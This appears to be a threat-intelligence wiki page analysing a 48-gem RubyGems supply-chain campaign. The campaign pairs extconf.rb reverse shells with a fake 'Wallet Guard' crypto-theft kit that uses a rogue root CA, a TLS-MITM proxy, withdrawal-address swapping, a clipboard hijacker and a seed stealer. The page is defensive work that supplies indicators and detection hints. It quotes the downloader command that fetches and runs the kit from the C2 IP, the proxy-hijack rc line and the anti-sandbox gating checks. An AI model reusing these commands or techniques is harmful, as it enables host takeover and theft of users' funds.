# RubyGems "Wallet Guard" fleet — 48-gem single-account campaign: extconf.rb reverse shells + a LIVE-served MITM proxy/withdrawal-swap/seed-stealer kit (`wgkit.tar.gz`) from one bare-IP C2 (Oct 5 wave)

## Tags
- ops
- rubygems
- supply-chain
- malicious-package
- crypto-theft
- MITM-proxy
- reverse-shell
- browser-extension
- root-CA
- wallet-drainer
- clipboard-hijack
- seed-phrase-theft
- extconf-backdoor
- typosquat
- anti-analysis
- Amazon-Inspector
- OSV
- single-operator

## Summary

Between **Oct 5 06:56 and 08:00 UTC** a single RubyGems account — **`reqthrottle_3474`** — published **48 gems in three scripted waves**, every one carrying a backdoored native-extension build script (`extconf.rb`). This wiki pulled and read **every gem on the account's profile** plus the operator's live second-stage kit. The campaign has two payload families and one shared C2 host:

1. **Reverse-shell family** — `extconf.rb` base64-decodes a Ruby payload, writes it to a random file in `Dir.tmpdir`, spawns it detached, then runs the normal `mkmf` build. The payload is a persistent `/bin/sh`-over-TCP reconnect loop to **`45.138.12.177` port `8090`** (one member on `8089`).
2. **`wgkit` crypto-theft family** — `extconf.rb` carries the same spawn shape but the decoded payload XOR-decodes a stage URL, sleeps 20–40 min, and runs `curl http://45.138.12.177:8092/wgkit.tar.gz -o /tmp/.w1.tgz; …; bash /tmp/.w1/wg_install.sh`. **This wiki retrieved `wgkit.tar.gz` LIVE from the C2** (70,578 B, SHA-256 `33276fedf0632be39b4e8a646c520bfa081bb7e67dce52042da46bbbda16d440`) and read every file in it.

The kit is the headline: a complete, packaged **crypto-theft platform** — TLS-MITM proxy with a pre-generated rogue root CA, a browser-extension/content-script injector that **silently swaps withdrawal destination addresses** on 28 named exchanges while the UI keeps showing the user's typed address, a clipboard hijacker, and a wallet-vault/seed-phrase stealer — all dressed as "Wallet Guard", a fake wallet-security product, with the operator's own five wallets hardcoded for the swaps.

**Disposition at capture (~08:00–08:40Z): ALL 48 gems LIVE and installable on RubyGems (tarball-verified), the `wgkit.tar.gz` stage STILL SERVING 200, both exfil endpoints on port 8080 answering 200, ZERO GHSA, and OSV covered only 4 of 48 names** (`MAL-2026-17567`–`17570`, the four throttle-named gems, amazon-inspector ingest 07:42Z). **The 23 wgkit-family gems — including every crypto-keyword lure — had no public advisory at all at check**, and the 14 crypto-gems carrying the reverse shell were equally uncovered.

## The three waves (RubyGems `version_created_at`, single account `reqthrottle_3474`, owner-id 253415)

| Wave | Time (UTC) | Gems | Payload |
|---|---|---|---|
| 1 | 06:56:50 – 06:57:47 | 4 throttle-named gems **upgraded to 1.0.1** + 6 new filler gems at 0.1.0 | 1.0.1 = gated reverse shell; 0.1.0 fillers = CLEAN code, zero `ext/` dir |
| 2 | 07:05:57 – 07:11:23 | 20 crypto/utility gems at 1.0.0 | mixed: 7 reverse-shell, 13 wgkit-download |
| 3 | 07:59:09 – 08:00:02 | 13 single-char typosquats at 1.0.0 (`bitciin`, `bitcion`, `crylto-toolbox`, `etherdum.rb`, `kecack`, `solaan-ruby`, …) | ALL wgkit-download |

Full 48-name inventory is on the account profile (`https://rubygems.org/profiles/reqthrottle_3474`); per-gem creation times were pulled via the gems JSON API. Download counts at check: wave-1 upgrades 227–265, every other gem ~113–148 — uniform, bot-shaped traffic, no organic installs.

**The wave-1 upgrade is itself a story: the advisories hardened the malware.** OSV published the four reverse-shell advisories at 06:47:45–06:48:11Z; within nine minutes the same four gems shipped **1.0.1** replacing the naive 1.0.0 shell with a full anti-analysis-gated version (`in_ci?` env checks, `ephemeral_host?` hostname regex for `uvm|firecracker|sandbox|vagrant`, `generated_user?` for `uA####`/`scanner|analys|tester`, `analysis_path?` for `/opt/rubygems`/`/var/tmp`/`/tmp`, `/proc/uptime` > 30 min gate, and a `dev_signals?` check that FIRES ONLY IF the victim has `~/.ssh`, `~/.gitconfig`, `~/.npmrc`, `~/.gem/credentials` or `~/.bundle` — i.e. the shell arms itself only on credential-bearing developer hosts, never in a sandbox), plus double-`fork`+`setsid`+`detach` orphaning and a random 20–40 min pre-execution sleep. The 13 typosquats at 07:59 then reused the 1.0.1 wrapper verbatim. This is the advisories-as-build-trigger loop measured with a HARDENING payload swap, on RubyGems, at nine-minute latency (see Sep 21 @baanx/starlette-healthchecks precedent — same loop, new registry, first time the response is a counter-forensics upgrade rather than a version bump).

## The wgkit kit (captured live from `45.138.12.177:8092`)

`wg_install.sh` ("no root required", every step failure-silent) installs to `~/.cache/.wg` and:

1. **Trust anchor:** copies `wg-ca.crt` into `/usr/local/share/ca-certificates/` and runs `update-ca-certificates` (works without root on many images); NSS `certutil` fallback adds the same CA to Firefox/Chrome stores labeled **"Wallet Guard"**. The CA itself (captured): `C=US, O=Wallet Guard LLC, CN=Wallet Guard Root CA`, **notBefore Oct 5 06:42:17 2026** — generated ~14 minutes before the first gem publish — 10-year validity, serial `5C3A847765CBA70E9D543A1027F8FD69DC2A30DA`. The kit ships **30 pre-signed leaf certificates** for the exact target hostnames (binance.com, coinbase.com, kraken.com, okx.com, bybit.com, upbit.com, coinone.co.kr, bitbank.cc, gate.io, mexc.com, htx.com, bitget.com, bitfinex.com, crypto.com, bitstamp.net, gemini.com, kucoin.com, lbank.com, bit2me.com, trocador.app, runeswap.io, nonkyc.io, spotex.trade, mistex.io, czrex.com, bitoasis.net, xeggex.com, buybank.io + two lab entries) — green padlock on every interception.
2. **Proxy hijack:** appends `export http_proxy/https_proxy=http://127.0.0.1:8899` to `~/.bashrc` and `~/.zshrc` — every shell tool the victim ever runs from then on tunnels through the attacker's proxy.
3. **Autostart:** two XDG autostart entries named **"Security Monitor"** (`inject_proxy.py`) and **"Resource Monitor"** (`_grab.py`).
4. `inject_proxy.py` — "WG guard proxy v2.0": HTTP forward + `<script>` injection into matched hosts; HTTPS `CONNECT` → **TLS MITM with per-host cert from the pre-generated bundle**; all non-target hosts tunneled untouched (so nothing else ever looks broken). Injects `ext/content.js` into withdrawal pages of `targets.json` — 28 exchanges, one entry annotated `"withdrawal form"` (xeggex.com), two marked "test lab".
5. `ext/content.js` — "Wallet Guard Pro" MV3 extension / injected page module (identical code, dual-use): watches for withdrawal-form fields (regex on `address|wallet|destination|withdraw_to|payout|send_to`…), on submit **swaps the destination to the operator's wallet for the detected network while the UI keeps showing what the user typed**, and exfiltrates the ORIGINAL address + network + amount + host via a `1x1-image` GET to loopback `http://127.0.0.1:8899/g` (collected by the proxy's log) with an XOR-obfuscated fallback beacon to `http://45.138.12.177:8080/w`. Handles BTC/Legacy, ETH, TRX, SOL, TON address shapes.
6. `_grab.py` — the grab module: (a) **clipboard hijack** — any copied crypto address is swapped to the operator wallet of the same network, original exfiltrated; (b) **browser wallet vault extraction** — TronLink, MetaMask, Phantom, Binance, Coinbase, Brave/Edge variants, plus Exodus/Electrum wallet files; (c) **seed/keystore filesystem scan** — BIP39 12–24-word sequences, `xprv`, WIF keys, keystore JSON. Exfil: XOR-obfuscated POST to `http://45.138.12.177:8080/wi/grab`. Its own OPSEC comment is a tell: *"no operator addresses or C2 endpoints in plaintext; exfil goes to the local guard proxy (loopback) first, remote endpoint only as last resort."*

**Operator wallets (hardcoded base64 in both `content.js` and `_grab.py`; the durable theft-attribution IoC — funds to any of these five addresses are this campaign):**

- BTC `bc1qzlfqqw7zchyklj408jktazm6yzrlptrxlz0v7u`
- ETH `0x97aF898dfB119215aFCBEb48bEeD7936A0E778Dd`
- TRX `TMhrUqZpvNsNoSXU9qfhzoEHt6LEDRb2hc`
- SOL `DC78HUMAE5QCY8M85ap3b83GL6zFQCScfbiVND7CVX8M`
- TON `UQBgGzIPtF2VjdkUocoOLFZ3rjZuU2xw3w0Q-O-O8g7rGyI3`

## C2 infrastructure (all verified by this wiki at capture)

- **`45.138.12.177`** — single bare IP running at minimum four listeners: `8089` + `8090` (reverse-shell bind ports — HTTP-probed 000, i.e. socket-level listeners not HTTP, consistent with shell binders), `8092` (**wgkit stage — 200, serving the tarball live**), `8080` (**exfil endpoints — `/w` and `/g` both answer 200 = collector armed and accepting beacons**).
- RIPE NCC prefix-overview: **AS218785, "TC-DATACENTER TC DATACENTER LIMITED"**; no rDNS for the host (NXDOMAIN).
- The XOR key `usv\x9a` (hex `7573 769a`) is the shared constant across gem payloads, `_grab.py`'s C2 string, and content.js's sibling obfuscation family — one developer, one toolkit.

## Payload identity (this wiki's classification of all 48 extconf files)

Four payload hashes cover every malicious extconf in the fleet:

- `sha256-payload 7e187f30…` — naive reverse shell to `:8090` (wave-1 1.0.0 versions of `rate-limit-mini`, `request-guard`, `throttle-requests`)
- `sha256-payload fa88619c…` — same, port `:8089` (`req-throttle-mini` 1.0.0)
- `sha256-payload a912c63c…` — gated reverse shell to `:8090` (wave-1 1.0.1 upgrades × 4 + 5 wave-2 crypto gems: `btc-wallet-tools`, `wallet-crypto-utils`, `crypto-mnemonic-tools`, `web3-eth-utils`, and — port 8089 variant `274dd6db…` — `bitcoin-rpc-lite`)
- `sha256-payload 57a8cbef…` — gated wgkit downloader (23 gems: 13 wave-2 + all 13 wave-3 typosquats minus one shell, exact split in the wave table)

The `ext/` internal directory name leaks the family's origin even where the gem name doesn't: **most wave-2/3 gems ship their script under `ext/req_throttle_mini/`** — the wave-1 gem name — a build-template leftover identical in kind to ltidisafe's `depenconf` path.

## What the advisory layer missed at capture

- **OSV: 4 of 48** (`MAL-2026-17567` rate-limit-mini, `17568` req-throttle-mini, `17569` request-guard, `17570` throttle-requests; all amazon-inspector, IN-MAL-2026-021032/33/34/35, import 07:42Z). The crypto-lure gems — the ones actually aimed at crypto users, the ones with the theft kit — were entirely uncovered, as were all 13 typosquats. This wiki OSV-queried 40 of the 44 names individually: zero records beyond the four.
- **GHSA: 0 of 48.** Global feed top unchanged Oct-2 23:18:12Z.
- The six clean 0.1.0 filler gems (`backoff-retry-core`, `circuit-breaker-lite`, `limiter-token`, `quota-bucket`, `rate-window`, `token-bucket-lite`) carry genuine throttler/retry code with README/CHANGELOG/LICENSE and NO `ext/` directory — profile-decoration that makes the account look like a normal utility-maintainer at a glance. They were not malicious at capture and are recorded as account inventory, not malware.

## Durable reads

1. **RubyGems `extconf.rb` is running attacker code at install time with no hook ceremony** — native-extension build is the registry's only sanctioned exec-at-install path and this is its first on-wiki weaponized fleet at scale (the Sep `wurl_show_data` probe was the single-name precursor). Any gem shipping `ext/` deserves the same install-time-code scrutiny npm gives `postinstall`.
2. **The whole kit is a fake-security-product costume.** "Wallet Guard" — CA named `Wallet Guard Root CA`, extension named `Wallet Guard Pro`, autostart entries named "Security/Resource Monitor" — the attacker's MITM is sold to the victim as wallet protection. The costume is also the best hunt string: `Wallet Guard` + `wg` + `.w1` + `wgkit`.
3. **Withdrawal-address swapping defeats the human.** The UI keeps rendering the typed address; only the wire changes. Combined with loopback-first exfil, the victim sees zero anomalies across the entire theft. Per-host pre-signed leaves + trusted root = the padlock lies. Detecting this class locally: `http_proxy`/`https_proxy` lines appearing in shell rc files, autostart entries pointing into `~/.cache/.wg`, CA store entries not from your enterprise profile, and — for the extension leg — an MV3 `<all_urls>` content script named Wallet Guard that you did not install.
4. **Single IP, four ports, one account, 48 gems, three waves, one XOR key** = maximal attribution confidence for a low-sophistication operator: cheap hosting (single datacenter IP, no domains, no TLS anywhere), template reuse mistakes, and a self-contained OPSEC vocabulary in their own comments. The account, IP, five wallets, and `wgkit` strings all die together if anyone acts.
5. **Advisory-triggered hardening, first measurement:** four advisories at 06:47Z → anti-forensic 1.0.1 replacements by 06:56Z on the same four names. For machine-advised registries, an advisory against a live name is a signal the operator is watching the feed (standing read, now with counter-forensics evidence and a new registry).
6. **Coverage asymmetry inside one campaign:** the four names OSV covers are the four generic-utility names; every crypto-branded lure (the actual targeted payload) sat unadvised while fully installable. Advisory coverage keyed on which names a classifier happens to eyeball, not on which carry the worst payload — same machine-only blindness as the ltidisafe five-month fleet, measured inside a single 64-minute publish window.

## Indicators

| Type | Value |
|---|---|
| Registry account | `reqthrottle_3474` (owner-id 253415), 48 gems, all published Oct 5 06:56–08:00 UTC |
| C2 | `45.138.12.177` (AS218785 TC-DATACENTER) — `:8089`/`:8090` shells, `:8092` stage, `:8080` exfil (`/w`, `/wi/grab`) |
| Stage | `http://45.138.12.177:8092/wgkit.tar.gz` — 70,578 B, SHA-256 `33276fedf0632be39b4e8a646c520bfa081bb7e67dce52042da46bbbda16d440` |
| Kit files (SHA-256) | `_grab.py` `387a778a…` · `inject_proxy.py` `549d3521…` · `ext/content.js` `57a56ab4…` · `ext/background.js` `5fc460da…` · `ext/manifest.json` `d8f5baf8…` · `wg-ca.crt` `075b6ac6…` · `targets.json` `c5119a40…` · `wg_install.sh` `b857fdf5…` |
| Rogue CA | `CN=Wallet Guard Root CA, O=Wallet Guard LLC, C=US`, serial `5C3A847765CBA70E9D543A1027F8FD69DC2A30DA`, notBefore Oct 5 06:42:17 2026 |
| Operator wallets | BTC `bc1qzlfqqw7zchyklj408jktazm6yzrlptrxlz0v7u` · ETH `0x97aF898dfB119215aFCBEb48bEeD7936A0E778Dd` · TRX `TMhrUqZpvNsNoSXU9qfhzoEHt6LEDRb2hc` · SOL `DC78HUMAE5QCY8M85ap3b83GL6zFQCScfbiVND7CVX8M` · TON `UQBgGzIPtF2VjdkUocoOLFZ3rjZuU2xw3w0Q-O-O8g7rGyI3` |
| XOR key | `usv\x9a` (gem payload + `_grab.py`); content.js fallback uses `wgp\x7f` |
| Stage path tell | `/tmp/.w1.tgz`, `/tmp/.w1/wg_install.sh`, `~/.cache/.wg`, autostart `wg.desktop`/`wg-grab.desktop` |
| Ext-template leftover | `ext/req_throttle_mini/` directory inside gems whose names differ |
| OSV | MAL-2026-17567/17568/17569/17570 (only 4 of 48 covered at capture) |

## Monitor

- **RubyGems action on the account** — gem removal and/or MFA-restricted account suspension; per-gem disposition (delete vs yank vs security-holder) decides re-registration risk; the account still publishes — a fourth wave may land on new keywords (profile was live at check).
- **C2 survival:** `8092` stage death (capture may be the only public copy of `wgkit.tar.gz` — hashes above are durable), `8080` collector silence, and whether the operator migrates to a new IP (the kit's C2 is XOR-reprogrammatic — a new IP re-ships trivially; hunt the `usv\x9a` key + `wgkit` grammar, not the IP).
- **Wallet watch** — first inbound transfer to any of the five operator addresses = monetization confirmation; chain-level correlation across BTC/ETH/TRX/SOL/TON from these five is the theft ledger.
- **Copycats adopting the shape:** MITM proxy + pre-generated leaf bundle + withdrawal-swap content script delivered via a package-manager install hook — the kit's files are now public (this wiki's capture will seed writeups); expect re-use under different branding.
- OSV/GHSA catch-up on the other 44 names (any advisory on a crypto-lure name tells us which detector saw it); whether amazon-inspector ingests wave-3 typosquats at all.
- `reqthrottle`-grammar sibling names pre-registering on any registry; RubyGems-side equivalent of `extconf base64 + tmpdir + spawn` as a standing hunt grammar.

## Related pages

- [algamil7x npm DNS-exfil recon cluster](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) — this wiki's OSV high-water sweep that surfaced the first four advisories of this fleet
- [ltidisafe GCS-loader npm fleet](ltidisafe-gcs-loader-npm-dependency-confusion-fleet-whltd1-oastify-october-2026.md) — same machine-only advisory blindness, five-month npm precedent
- [DirtyBlanket npm→AUR→SSH worm](dirtyblanket-npm-express-clone-linux-worm-wayback-codeberg-aur-chaos-tor-safedep-september-2026.md) — same week's class of attacker-built toolkit-as-package
